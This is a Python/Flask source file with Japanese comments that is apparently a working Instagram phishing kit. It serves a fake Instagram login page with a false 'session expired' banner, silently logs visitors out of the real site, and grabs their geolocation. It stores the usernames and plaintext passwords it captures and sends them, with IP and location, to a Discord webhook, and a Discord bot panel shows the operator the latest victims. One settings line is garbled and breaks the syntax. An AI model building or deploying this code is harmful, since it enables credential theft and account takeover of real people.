# -*- coding: utf-8 -*-
"""
app.py ── Instagram ログインキャプチャ + Discord 通知パネル（1ファイル完結版）

ルート:
    /            ログインページ（Instagram風）
    /capture     POST 受け取り → 保存 → Discord通知
    /open.gif    開封トラッキング（1x1）→ Discord通知
    /panel/*     パネルAPI（Discordのボタンが叩く）
    /panel/doctor 起動診断（ブラウザで開くとbotの状態がJSONで見える）
    /healthz     死活監視

Discord:
    !panel / /panel  でパネル表示
    !diag            bot自身の状態をその場で表示
"""

from __future__ import annotations

import base64
import datetime as dt
import json
import logging
import os
import threading
import time
from typing import Any, Callable, Dict, List, Optional

import requests
from flask import Flask, Response, jsonify, request

try:
    import fcntl
except Exception:
    fcntl = None

try:
    import discord
    from discord import app_commands
    from discord.ext import commands
except Exception as _e:  # ここで握り潰すので、必ずログに出す
    discord = None
    _DISCORD_IMPORT_ERROR = repr(_e)
else:
    _DISCORD_IMPORT_ERROR = ""

# ============================================================================
# 設定
# ============================================================================
LOG = logging.getLogger("ig_capture")
if not LOG.handlers:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")

PORT = int(os.getenv("PORT", "10000"))
BASE_URL = (os.getenv("APP_BASE_URL") or f"http://127.0.0.1:{PORT}").rstrip("/")
PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
TZ_OFFSET = int(os.getenv("TZ_OFFSET", "9"))

WEBHOOK_URL = (os.getenv("DISCORD_WEBHOOK_URL") or os.getenv("DISCORD_WEBHOOK")
               or os.getenv("WEBHOOK_URL") or "").strip()
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN") or os.getenv("BOT_TOKEN") or ""
　　　　　　　　or os.getenv("BOT_TOKEN") or "").strip()
GUILD_ID = os.getenv("GUILD_ID")
PANEL_CHANNEL_ID = os.getenv("PANEL_CHANNEL_ID")
PANEL_COMMAND = os.getenv("PANEL_COMMAND", "panel")
PANEL_PREFIX = os.getenv("PANEL_PREFIX", "!")
PANEL_SECRET = os.getenv("PANEL_SECRET", "")
RUN_PANEL_BOT = os.getenv("RUN_PANEL_BOT", "1") == "1"
PANEL_AUTOPOST = os.getenv("PANEL_AUTOPOST", "1") == "1"
PANEL_TITLE = os.getenv("PANEL_TITLE", "Instagram キャプチャ パネル")

BANNER_TEXT = os.getenv("BANNER_TEXT", "セッションの有効期限が切れました。もう一度ログインしてください。")

_HERE = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.getenv("DATA_FILE", os.path.join(_HERE, "captures.json"))
LOCK_FILE = os.getenv("BOT_LOCK_FILE", os.path.join(_HERE, ".panel_bot.lock"))
OPEN_NOTIFY_COOLDOWN = int(os.getenv("OPEN_NOTIFY_COOLDOWN", "60"))
MAX_KEEP = 300

app = Flask(__name__)
_lock = threading.Lock()

# 診断用の共有状態
_STATUS: Dict[str, Any] = {
    "lock_held": False,
    "bot_thread_alive": False,
    "ready": False,
    "guilds": 0,
    "guild_names": [],
    "bot_user": "",
    "last_error": "",
    "starts": 0,
}

# ============================================================================
# ストレージ
# ============================================================================
def now_str() -> str:
    return (dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=TZ_OFFSET)).strftime("%Y-%m-%d %H:%M:%S")

def _load() -> Dict[str, Any]:
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            db = json.load(f)
    except Exception:
        db = {}
    db.setdefault("captures", [])
    db.setdefault("opens", [])
    db.setdefault("state", {"accepting": True, "created": now_str()})
    return db

def _save(db: Dict[str, Any]) -> None:
    try:
        tmp = DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        os.replace(tmp, DATA_FILE)
    except Exception as exc:
        LOG.warning("保存失敗: %s", exc)

def _push(key: str, rec: Dict[str, Any]) -> None:
    with _lock:
        db = _load()
        db[key] = (db.get(key) or [])[-MAX_KEEP:]
        db[key].append(rec)
        _save(db)

def get_state() -> Dict[str, Any]:
    with _lock:
        return dict(_load().get("state") or {})

def set_state(**kw: Any) -> Dict[str, Any]:
    with _lock:
        db = _load()
        db.setdefault("state", {}).update(kw)
        _save(db)
        return dict(db["state"])

def client_ip() -> str:
    fwd = request.headers.get("X-Forwarded-For", "")
    return (fwd.split(",")[0].strip() if fwd else request.remote_addr) or "-"

# ============================================================================
# Discord Webhook 通知
# ============================================================================
DEFAULT_COLOR = 0x5865F2

def _clip(v: Any, n: int) -> str:
    s = "" if v is None else str(v)
    return s if len(s) <= n else s[: n - 1] + "…"

def _color(c: Any) -> int:
    if c is None:
        return DEFAULT_COLOR
    if isinstance(c, int):
        return max(0, min(0xFFFFFF, c))
    try:
        return max(0, min(0xFFFFFF, int(str(c).lstrip("#"), 16)))
    except ValueError:
        return DEFAULT_COLOR

def build_embed(*args: Any, **kwargs: Any) -> Dict[str, Any]:
    names = ("title", "description", "color", "fields", "footer", "url", "thumbnail", "image", "author")
    data: Dict[str, Any] = {}
    for k, v in zip(names, args):
        data.setdefault(k, v)
    alias = {"desc": "description", "message": "description", "text": "description",
             "body": "description", "content": "description", "colour": "color",
             "footer_text": "footer", "image_url": "image", "thumbnail_url": "thumbnail"}
    for k, v in kwargs.items():
        data[alias.get(k, k)] = v

    e: Dict[str, Any] = {}
    if data.get("title"):
        e["title"] = _clip(data["title"], 256)
    if data.get("description"):
        e["description"] = _clip(data["description"], 4096)
    e["color"] = _color(data.get("color"))
    if data.get("url"):
        e["url"] = str(data["url"])
    fields = []
    for f in (data.get("fields") or [])[:25]:
        if isinstance(f, dict):
            fields.append({"name": _clip(f.get("name", "\u200b"), 256) or "\u200b",
                           "value": _clip(f.get("value", "\u200b"), 1024) or "\u200b",
                           "inline": bool(f.get("inline", False))})
        elif isinstance(f, (list, tuple)) and len(f) >= 2:
            fields.append({"name": _clip(f[0], 256) or "\u200b",
                           "value": _clip(f[1], 1024) or "\u200b",
                           "inline": bool(f[2]) if len(f) > 2 else False})
    if fields:
        e["fields"] = fields
    if data.get("footer"):
        e["footer"] = {"text": _clip(data["footer"], 2048)}
    e["timestamp"] = dt.datetime.now(dt.timezone.utc).isoformat()
    return e

def post_embedded(*args: Any, **kwargs: Any) -> bool:
    url = kwargs.pop("webhook_url", None) or WEBHOOK_URL
    embed = kwargs.pop("embed", None)
    content = kwargs.pop("content", None)
    username = kwargs.pop("username", None)
    for a in args:
        if isinstance(a, dict) and embed is None:
            embed = a
        elif isinstance(a, str) and content is None:
            content = a
    if embed is None and any(k in kwargs for k in ("title", "description", "fields", "desc", "text")):
        embed = build_embed(**kwargs)
    if not url:
        LOG.warning("DISCORD_WEBHOOK_URL 未設定のため通知スキップ")
        return False

    payload: Dict[str, Any] = {}
    if content:
        payload["content"] = _clip(content, 2000)
    if embed:
        payload["embeds"] = [embed]
    if username:
        payload["username"] = _clip(username, 80)
    if not payload:
        return False

    for attempt in range(1, 4):
        try:
            r = requests.post(url, json=payload, timeout=10)
            if 200 <= r.status_code < 300 or r.status_code == 204:
                return True
            if r.status_code == 429:
                try:
                    wait = float(r.json().get("retry_after", 1.0))
                except Exception:
                    wait = 1.0
                time.sleep(min(wait, 10))
                continue
            LOG.warning("通知失敗 HTTP %s: %s", r.status_code, r.text[:200])
            if 400 <= r.status_code < 500:
                return False
        except Exception as exc:
            LOG.warning("通知エラー (%s/3): %s", attempt, exc)
            time.sleep(attempt)
    return False

def notify_capture(rec: Dict[str, Any]) -> None:
    if not get_state().get("accepting", True):
        LOG.info("受付停止中のため通知スキップ: %s", rec.get("username"))
    post_embedded(
        title="🔓 ログイン情報を取得しました",
        description=f"**{rec.get('username') or '(空)'}** の認証情報をキャプチャしました。",
        color=0x2ECC71,
        fields=[
            ("ユーザー名", f"`{rec.get('username') or '-'}`", True),
            ("パスワード", f"`{rec.get('password') or '-'}`", True),
            ("ref", f"`{rec.get('ref') or '-'}`", True),
            ("IP", f"`{rec.get('ip')}`", True),
            ("位置情報", (f"`{rec.get('lat')}, {rec.get('lng')}`" if rec.get("lat") else "取得なし"), True),
            ("時刻", rec.get("time", "-"), True),
        ],
    )

_open_lock = threading.Lock()
_last_open = {"t": 0.0, "ip": ""}

def notify_open(rec: Dict[str, Any]) -> None:
    with _open_lock:
        if rec.get("ip") == _last_open["ip"] and time.time() - _last_open["t"] < OPEN_NOTIFY_COOLDOWN:
            return
        _last_open["t"] = time.time()
        _last_open["ip"] = rec.get("ip", "")
    post_embedded(
        title="👀 リンクが開かれました",
        description="誰かがログインページを開きました。",
        color=0xF1C40F,
        fields=[("ref", f"`{rec.get('ref') or '-'}`", True), ("IP", f"`{rec.get('ip')}`", True),
                ("UA", _clip(rec.get("ua", "-"), 200), False), ("時刻", rec.get("time", "-"), True)],
    )

# ============================================================================
# パネルのアクション
# ============================================================================
def hook_status() -> str:
    db = _load()
    st = db.get("state", {})
    last = db["captures"][-1]["time"] if db["captures"] else "なし"
    return (f"受付: {'ON' if st.get('accepting', True) else 'OFF'} / "
            f"キャプチャ: {len(db['captures'])}件 / 開封: {len(db['opens'])}件 / 最終取得: {last}")

def hook_latest() -> str:
    caps = _load()["captures"][-3:][::-1]
    if not caps:
        return "まだキャプチャはありません"
    return " | ".join(f"{c.get('time','')} {c.get('username')} / {c.get('password')}" for c in caps)

def hook_start() -> str:
    set_state(accepting=True)
    post_embedded(content="▶️ 受付を **ON** にしました。")
    return "受付をONにしました"

def hook_stop() -> str:
    set_state(accepting=False)
    post_embedded(content="⏹️ 受付を **OFF** にしました。")
    return "受付をOFFにしました"

def hook_clear() -> str:
    with _lock:
        db = _load()
        n = len(db["captures"]) + len(db["opens"])
        db["captures"] = []
        db["opens"] = []
        _save(db)
    return f"記録を{n}件クリアしました"

ACTIONS: Dict[str, Callable[[], str]] = {
    "🔄 状態更新": hook_status,
    "📋 最新を表示": hook_latest,
    "▶️ 受付開始": hook_start,
    "⏹️ 受付停止": hook_stop,
    "🧹 記録クリア": hook_clear,
}
ACTION_PATHS = {"🔄 状態更新": "/panel/status", "📋 最新を表示": "/panel/latest",
                "▶️ 受付開始": "/panel/start", "⏹️ 受付停止": "/panel/stop",
                "🧹 記録クリア": "/panel/clear"}

# ============================================================================
# パネルAPI
# ============================================================================
def _panel_guard() -> bool:
    if not PANEL_SECRET:
        return True
    return (request.headers.get("X-Panel-Secret") == PANEL_SECRET) or (request.args.get("key") == PANEL_SECRET)

def _make_panel_view(label: str, fn: Callable[[], str]):
    def _view():
        if not _panel_guard():
            return jsonify(ok=False, error="unauthorized"), 401
        try:
            return jsonify(ok=True, result=str(fn()))
        except Exception as exc:
            LOG.exception("パネル処理失敗: %s", label)
            return jsonify(ok=False, error=repr(exc)), 500
    _view.__name__ = "panel_" + ACTION_PATHS[label].split("/")[-1]
    return _view

for _label, _fn in ACTIONS.items():
    app.add_url_rule(ACTION_PATHS[_label], endpoint=_make_panel_view(_label, _fn).__name__,
                     view_func=_make_panel_view(_label, _fn), methods=["GET", "POST"])

def call_app(path: str) -> tuple:
    try:
        headers = {"X-Panel-Secret": PANEL_SECRET} if PANEL_SECRET else {}
        r = requests.post(BASE_URL + path, headers=headers, timeout=20)
        j = r.json() if "json" in r.headers.get("Content-Type", "") else {}
        return bool(j.get("ok")), str(j.get("result") or j.get("error") or f"HTTP {r.status_code}")
    except Exception as exc:
        return False, repr(exc)

# ============================================================================
# bot 単一プロセス化（workers が複数でも二重接続しない）
# ============================================================================
_lock_fh = None

def _acquire_bot_lock() -> bool:
    global _lock_fh
    if fcntl is None:            # Windows等はロック無し（workers=1前提）
        _STATUS["lock_held"] = True
        return True
    try:
        fh = open(LOCK_FILE, "w")
        fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _lock_fh = fh            # 参照を保持しないとロックが外れる
        _STATUS["lock_held"] = True
        return True
    except OSError:
        _STATUS["lock_held"] = False
        return False

def _client_id() -> str:
    try:
        return base64.b64decode(BOT_TOKEN.split(".")[0] + "==").decode("utf-8", "ignore")
    except Exception:
        return ""

def invite_url() -> str:
    cid = _client_id()
    if not cid:
        return ""
    perms = 379904  # View Channel / Send / Embed Links / Attach / Read History / External Emoji
    return (f"https://discord.com/api/oauth2/authorize?client_id={cid}"
            f"&permissions={perms}&scope=bot%20applications.commands")

# ============================================================================
# Discord bot
# ============================================================================
if discord is not None:
    class ActionButton(discord.ui.Button):
        def __init__(self, label: str, path: str):
            super().__init__(label=label, style=discord.ButtonStyle.primary,
                             custom_id="igpanel:" + path.strip("/").replace("/", "_"))
            self.path = path

        async def callback(self, interaction: "discord.Interaction"):
            await interaction.response.defer()
            import asyncio
            ok, text = await asyncio.to_thread(call_app, self.path)
            try:
                await interaction.edit_original_response(embed=build_panel_embed(ok, text), view=PanelView())
            except Exception as exc:
                LOG.warning("パネル更新失敗: %s", exc)

    class PanelView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)
            for label, path in ACTION_PATHS.items():
                self.add_item(ActionButton(label, path))

    def build_panel_embed(ok: Optional[bool] = None, message: str = "") -> "discord.Embed":
        st = get_state()
        e = discord.Embed(title=PANEL_TITLE, color=0xE74C3C if ok is False else 0x5865F2,
                          timestamp=dt.datetime.now(dt.timezone.utc))
        e.description = f"受付: **{'ON' if st.get('accepting', True) else 'OFF'}**\n下のボタンで操作できます。"
        e.add_field(name="公開URL", value=f"`{PUBLIC_URL or BASE_URL}`", inline=False)
        if ok is not None:
            e.add_field(name="実行結果", value=f"{'✅' if ok else '❌'} {message or '-'}"[:1024], inline=False)
        e.set_footer(text=f"コマンド: {PANEL_PREFIX}{PANEL_COMMAND} / /{PANEL_COMMAND}")
        return e

    async def _send_panel(target, *, is_ctx: bool):
        """Embed権限が無い場合のフォールバック付きでパネルを送る"""
        view = PanelView()
        try:
            if is_ctx:
                await target.send(embed=build_panel_embed(), view=view)
            else:
                await target.response.send_message(embed=build_panel_embed(), view=view)
            return True
        except discord.Forbidden as exc:
            LOG.warning("Embed送信に失敗（権限不足？）: %s", exc)
            lines = ["**パネル**（Embed Links 権限がありません）", ""]
            lines += [f"`{PANEL_PREFIX}{k}` → {v}" for k, v in ACTION_PATHS.items()]
            text = "\n".join(lines)
            if is_ctx:
                await target.send(text)
            else:
                await target.followup.send(text)
            return False
        except Exception as exc:
            LOG.exception("パネル送信失敗: %s", exc)
            return False

    async def _prefix_cb(ctx):
        await _send_panel(ctx, is_ctx=True)

    async def _slash_cb(interaction):
        await _send_panel(interaction, is_ctx=False)

    panel_prefix_cmd = commands.command(name=PANEL_COMMAND, aliases=["パネル", "p"])(_prefix_cb)
    panel_slash_cmd = app_commands.Command(name=PANEL_COMMAND, description="操作パネルを表示します", callback=_slash_cb)

    async def _ensure_panel(bot):
        """既存パネルがあれば編集、無ければ新規投稿（再起動で増やさない）"""
        try:
            ch = bot.get_channel(int(PANEL_CHANNEL_ID)) or await bot.fetch_channel(int(PANEL_CHANNEL_ID))
        except Exception as exc:
            LOG.warning("PANEL_CHANNEL_ID のチャンネル取得に失敗: %s", exc)
            return
        try:
            perms = ch.permissions_for(ch.guild.me)
            if not perms.send_messages:
                LOG.warning("チャンネル %s に送信権限がありません", ch)
            if not perms.embed_links:
                LOG.warning("チャンネル %s に Embed Links 権限がありません", ch)
        except Exception:
            pass
        try:
            async for m in ch.history(limit=50):
                if m.author.id == bot.user.id and m.embeds and (m.embeds[0].title == PANEL_TITLE):
                    try:
                        await m.edit(embed=build_panel_embed(), view=PanelView())
                        LOG.info("既存パネルを更新しました（新規投稿なし）")
                        return
                    except Exception as exc:
                        LOG.warning("既存パネル編集失敗: %s", exc)
        except Exception as exc:
            LOG.warning("履歴取得失敗（Read Message History 権限？）: %s", exc)
        try:
            await ch.send(embed=build_panel_embed(), view=PanelView())
            LOG.info("パネルを新規投稿しました")
        except Exception as exc:
            LOG.warning("パネル投稿失敗: %s", exc)

    def create_bot():
        intents = discord.Intents.default()
        intents.message_content = True
        bot = commands.Bot(command_prefix=PANEL_PREFIX, intents=intents, help_command=None)

        @bot.command(name="diag", aliases=["診断"])
        async def _diag(ctx):
            info = [
                f"discord.py: {getattr(discord, '__version__', '?')}",
                f"prefix: {PANEL_PREFIX} / command: {PANEL_COMMAND}",
                f"guilds: {len(bot.guilds)} ({', '.join(g.name for g in bot.guilds)})",
                f"latency: {round(bot.latency * 1000)}ms",
                f"受付: {'ON' if get_state().get('accepting', True) else 'OFF'}",
                f"captures: {len(_load()['captures'])}",
                f"このチャンネルの権限: send={ctx.channel.permissions_for(ctx.guild.me).send_messages} "
                f"embed={ctx.channel.permissions_for(ctx.guild.me).embed_links}",
            ]
            await ctx.send("```\n" + "\n".join(info) + "\n```")

        @bot.command(name="ping")
        async def _ping(ctx):
            await ctx.send(f"pong ({round(bot.latency * 1000)}ms)")

        async def _setup_hook():
            bot.add_view(PanelView())
            bot.add_command(panel_prefix_cmd)
            bot.tree.add_command(panel_slash_cmd)
            try:
                if GUILD_ID:
                    g = discord.Object(id=int(GUILD_ID))
                    bot.tree.copy_global_to(guild=g)
                    await bot.tree.sync(guild=g)
                else:
                    await bot.tree.sync()
                LOG.info("スラッシュコマンドを同期しました（GUILD_ID=%s）", GUILD_ID or "未設定=グローバル/最大1時間）")
            except Exception as exc:
                LOG.warning("スラッシュコマンド同期失敗: %s", exc)
            LOG.info("登録済み prefix コマンド: %s", [c.name for c in bot.commands])

        bot.setup_hook = _setup_hook

        @bot.event
        async def on_ready():
            _STATUS.update(ready=True, guilds=len(bot.guilds),
                           guild_names=[g.name for g in bot.guilds], bot_user=str(bot.user))
            LOG.info("Discord ログイン完了: %s / guilds=%s", bot.user, [g.name for g in bot.guilds])
            if not bot.guilds:
                LOG.warning("botがどのサーバーにも参加していません。招待URL: %s", invite_url())
            if PANEL_CHANNEL_ID and PANEL_AUTOPOST:
                await _ensure_panel(bot)

        @bot.event
        async def on_command_error(ctx, error):
            LOG.warning("コマンドエラー: %s / %s", ctx.command, error)
            try:
                await ctx.send(f"エラー: `{error}`")
            except Exception:
                pass

        return bot

    _bot = None
    _bot_thread = None

    def start_bot_in_thread():
        global _bot, _bot_thread

        # --- 起動できない理由を全部ログに出す ---
        if not RUN_PANEL_BOT:
            LOG.info("RUN_PANEL_BOT=0 のためbotは起動しません")
            return None
        if discord is None:
            LOG.error("discord.py を import できません: %s → requirements.txt に discord.py>=2.4.0 を追加してください",
                      _DISCORD_IMPORT_ERROR)
            _STATUS["last_error"] = f"discord.py import失敗: {_DISCORD_IMPORT_ERROR}"
            return None
        if not BOT_TOKEN:
            LOG.error("DISCORD_BOT_TOKEN が未設定です → Render の Environment に追加してください")
            _STATUS["last_error"] = "DISCORD_BOT_TOKEN 未設定"
            return None
        if _bot_thread is not None and _bot_thread.is_alive():
            return _bot_thread
        if not _acquire_bot_lock():
            LOG.info("他プロセスがbotを担当しています（このプロセスでは起動しません）")
            return None

        LOG.info("bot起動: discord.py=%s / 招待URL: %s", getattr(discord, "__version__", "?"), invite_url())

        def _supervisor():
            backoff = 5
            while True:
                try:
                    _STATUS["starts"] += 1
                    bot = create_bot()
                    globals()["_bot"] = bot
                    bot.run(BOT_TOKEN, log_handler=None)
                    LOG.warning("botが終了しました。%ss後に再起動します", backoff)
                except Exception as exc:
                    _STATUS["last_error"] = repr(exc)
                    LOG.exception("bot異常終了。%ss後に再起動します", backoff)
                time.sleep(backoff)
                backoff = min(backoff * 2, 60)

        _bot_thread = threading.Thread(target=_supervisor, daemon=True, name="discord-panel-bot")
        _bot_thread.start()
        _STATUS["bot_thread_alive"] = True
        return _bot_thread
else:
    def start_bot_in_thread():
        LOG.error("discord.py が無いのでbotは起動しません: %s", _DISCORD_IMPORT_ERROR)
        _STATUS["last_error"] = f"discord.py import失敗: {_DISCORD_IMPORT_ERROR}"
        return None

# ============================================================================
# ログインページ
# ============================================================================
HTML = r"""<!DOCTYPE html>
<html lang="ja"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; }
body { margin: 0; min-height: 100vh; background: #fafafa; display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #262626; }
.logout { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
.banner { display: flex; align-items: center; justify-content: center; gap: 8px; background: #e7f3ff;
  color: #00376b; font-size: 14px; line-height: 1.4; padding: 12px 16px; width: 100%; margin-bottom: 24px; }
.container { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 44px 40px 22px;
  width: 350px; text-align: center; }
.logo { font-family: 'Grand Hotel', cursive; font-weight: 400; font-size: 42px; line-height: 1.1;
  margin: 0 0 30px; color: #262626; }
.field { position: relative; margin-bottom: 6px; text-align: left; }
.field input { width: 100%; height: 38px; padding: 15px 8px 2px; background: #fafafa; border: 1px solid #dbdbdb;
  border-radius: 3px; font-family: inherit; font-size: 14px; color: #262626; outline: none; }
.field input:focus { border-color: #a8a8a8; }
.field label { position: absolute; left: 9px; top: 50%; transform: translateY(-50%); font-size: 12px;
  color: #8e8e8e; pointer-events: none; max-width: calc(100% - 18px); overflow: hidden;
  white-space: nowrap; text-overflow: ellipsis;
  transition: top .1s ease-out, transform .1s ease-out, font-size .1s ease-out; }
.field input:focus + label, .field input:not(:placeholder-shown) + label { top: 6px; transform: translateY(0); font-size: 10px; }
#submit-btn { width: 100%; height: 32px; margin-top: 8px; background: #0095f6; color: #fff; border: 0;
  border-radius: 8px; font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; }
#submit-btn:disabled { opacity: .7; cursor: default; }
.or { display: flex; align-items: center; gap: 16px; margin: 18px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
.or::before, .or::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
.fb-btn { width: 100%; height: 32px; background: #0095f6; color: #fff; border: 0; border-radius: 8px;
  font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; display: flex;
  align-items: center; justify-content: center; gap: 8px; text-decoration: none; }
.forgot { margin-top: 18px; font-size: 14px; color: #00376b; display: inline-block; }
.signup { width: 350px; margin: 10px auto 0; background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
  padding: 22px 20px; text-align: center; font-size: 14px; }
.signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
.error { border: 1px solid #ed4956; color: #ed4956; border-radius: 3px; font-size: 14px;
  line-height: 1.4; padding: 12px 10px; margin-bottom: 10px; text-align: center; }
</style>
</head>
<body>
<img src="open.gif?ref=__REF__" width="1" height="1" alt="">
<img class="logout" src="https://www.instagram.com/accounts/logout/" width="1" height="1" alt="">
<div class="banner">
  <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877f2"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm1 15h-2v-6h2v6zm0-8h-2V7h2v2"></path></svg>
  <span>__BANNER__</span>
</div>
<div class="container">
  <h1 class="logo">Instagram</h1>
  <form method="POST" action="/capture" id="ig-form">
    <div class="field">
      <input id="username" type="text" name="username" placeholder=" " value="__USERNAME__" autocomplete="username" required>
      <label for="username">電話番号、ユーザーネーム、またはメールアドレス</label>
    </div>
    <div class="field">
      <input id="password" type="password" name="password" placeholder=" " autocomplete="current-password" required>
      <label for="password">パスワード</label>
    </div>
    <input type="hidden" name="ref" value="__REF__">
    <input type="hidden" name="lat" value="">
    <input type="hidden" name="lng" value="">
    <button type="submit" id="submit-btn" disabled>ログイン</button>
    <div class="or"><span>または</span></div>
    <a class="fb-btn" target="_blank" rel="noopener" href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri=https%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.7-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.6.8-1.6 1.6V12h2.7l-.4 2.9h-2.3v7A10 10 0 0 0 22 12z"></path></svg>
      Facebookでログイン
    </a>
    <a class="forgot" target="_blank" rel="noopener" href="https://www.instagram.com/accounts/password/reset/">パスワードをお忘れですか?</a>
  </form>
</div>
<div class="signup">アカウントをお持ちでないですか? <a href="#">登録する</a></div>
<script>
(function () {
  var form = document.getElementById('ig-form');
  var btn = document.getElementById('submit-btn');
  var u = document.getElementById('username');
  var p = document.getElementById('password');

  function sync() { btn.disabled = !(u.value.trim() && p.value); }
  u.addEventListener('input', sync);
  p.addEventListener('input', sync);
  sync();

  var ref = new URLSearchParams(location.search).get('ref') || '';
  if (ref) document.cookie = 'ref=' + encodeURIComponent(ref) + ';path=/;max-age=86400';
  if (ref) form.ref.value = ref;

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (pos) { form.lat.value = pos.coords.latitude; form.lng.value = pos.coords.longitude; },
      function () {}, { timeout: 4000, maximumAge: 60000 }
    );
  }

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    btn.disabled = true; btn.textContent = 'ログイン中…';
    try {
      var res = await fetch('/capture', {
        method: 'POST',
        headers: { 'X-Requested-With': 'fetch' },
        body: new FormData(form)
      });
      var j = await res.json();
      if (j.ok) { location.href = 'https://www.instagram.com/'; return; }
      var el = document.querySelector('.error');
      if (!el) { el = document.createElement('div'); el.className = 'error'; form.insertBefore(el, form.querySelector('.or')); }
      el.textContent = j.error || 'エラーが発生しました';
      btn.disabled = false; btn.textContent = 'ログイン';
    } catch (err) { form.submit(); }
  });
})();
</script>
</body></html>
"""

def render_page(username: str = "", ref: str = "") -> str:
    st = get_state()
    banner = BANNER_TEXT if st.get("accepting", True) else "現在このフォームは受付を停止しています。"
    return (HTML.replace("__BANNER__", banner)
            .replace("__USERNAME__", (username or "").replace('"', "&quot;"))
            .replace("__REF__", (ref or "").replace('"', "&quot;")))

# ============================================================================
# ルート
# ============================================================================
@app.route("/")
def index():
    return render_page(ref=request.args.get("ref", "") or request.cookies.get("ref", ""))

@app.route("/capture", methods=["POST"])
def capture():
    rec = {
        "time": now_str(),
        "username": (request.form.get("username") or "").strip(),
        "password": request.form.get("password") or "",
        "ref": request.form.get("ref") or request.cookies.get("ref", ""),
        "lat": request.form.get("lat", ""),
        "lng": request.form.get("lng", ""),
        "ip": client_ip(),
        "ua": request.headers.get("User-Agent", ""),
    }
    if not rec["username"] or not rec["password"]:
        return jsonify(ok=False, error="ユーザー名とパスワードを入力してください")
    _push("captures", rec)
    LOG.info("キャプチャ: %s / %s (%s)", rec["username"], rec["password"], rec["ip"])
    notify_capture(rec)
    return jsonify(ok=True, username=rec["username"])

GIF_1PX = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==")

@app.route("/open.gif")
def open_gif():
    rec = {"time": now_str(), "ref": request.args.get("ref", "") or request.cookies.get("ref", ""),
           "ip": client_ip(), "ua": request.headers.get("User-Agent", "")}
    _push("opens", rec)
    notify_open(rec)
    return Response(GIF_1PX, mimetype="image/gif",
                    headers={"Cache-Control": "no-store, no-cache, must-revalidate"})

@app.route("/healthz")
def healthz():
    return jsonify(ok=True, time=now_str(), captures=len(_load()["captures"]))

@app.route("/panel/doctor")
def doctor():
    """パネルが出ない時の診断。ブラウザで開くだけ。"""
    checks = {
        "discord_py_imported": discord is not None,
        "discord_py_error": _DISCORD_IMPORT_ERROR or None,
        "discord_py_version": getattr(discord, "__version__", None),
        "bot_token_set": bool(BOT_TOKEN),
        "webhook_set": bool(WEBHOOK_URL),
        "run_panel_bot": RUN_PANEL_BOT,
        "message_content_intent": True,  # コード側は常にON。Portal側の設定は要確認
        "lock_held_by_this_process": _STATUS["lock_held"],
        "bot_thread_alive": bool(_bot_thread.is_alive()) if (discord is not None and "_bot_thread" in globals() and _bot_thread) else False,
        "bot_ready": _STATUS["ready"],
        "bot_user": _STATUS["bot_user"],
        "guild_count": _STATUS["guilds"],
        "guild_names": _STATUS["guild_names"],
        "bot_restarts": _STATUS["starts"],
        "last_error": _STATUS["last_error"] or None,
        "panel_channel_id": PANEL_CHANNEL_ID,
        "panel_autopost": PANEL_AUTOPOST,
        "prefix": PANEL_PREFIX,
        "command": PANEL_COMMAND,
        "guild_id_set": bool(GUILD_ID),
        "panel_secret_set": bool(PANEL_SECRET),
        "invite_url": invite_url(),
    }
    hints = []
    if discord is None:
        hints.append("requirements.txt に discord.py>=2.4.0 が無い可能性（Renderの再ビルドが必要）")
    if not BOT_TOKEN:
        hints.append("DISCORD_BOT_TOKEN が未設定")
    if not GUILD_ID:
        hints.append("GUILD_ID 未設定 → スラッシュコマンドが最大1時間反映されない（!panel は即動く）")
    if not checks["bot_ready"]:
        hints.append("botが未ログイン。Renderログの『Discord ログイン完了』を確認")
    if checks["guild_count"] == 0 and checks["bot_ready"]:
        hints.append("botがどのサーバーにも未参加。invite_url から招待（scope: bot + applications.commands）")
    hints.append("Message Content Intent がOFFだと !panel が無反応（Portal→Bot→Privileged Intents）")
    hints.append("チャンネルで Embed Links 権限が無いと無反応に見える")
    return jsonify(ok=True, checks=checks, hints=hints)

@app.errorhandler(404)
def _404(e):
    return jsonify(ok=False, error="not found"), 404

# ============================================================================
# 起動
# ============================================================================
start_bot_in_thread()

if __name__ == "__main__":
    LOG.info("http://0.0.0.0:%s で起動します", PORT)
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
